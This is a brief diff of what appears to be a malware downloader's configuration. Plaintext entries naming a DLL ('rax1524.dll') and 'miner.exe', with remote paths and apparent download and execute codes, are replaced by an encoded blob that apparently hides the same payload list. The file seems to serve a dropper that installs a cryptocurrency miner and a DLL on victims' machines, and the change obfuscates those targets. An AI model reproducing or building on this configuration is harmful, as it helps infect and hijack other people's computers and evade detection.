@@ -1,2 +1,1 @@
-D rax1524.dll /mhali43/mw2/refs/heads/main/dll.txt
-E miner.exe /mhali43/mw2/refs/heads/main/miner.txt
+7orYy9Kbn5iehM7GxoqFx8LLxsOemYXH3ZiF2M/M2YXCz8vO2YXHy8PEhc7GxoTe0t6g74rHw8TP2ITP0s+KhcfCy8bDnpmFx92YhdjPzNmFws/LztmFx8vDxIXHw8TP2ITe0t6goA==
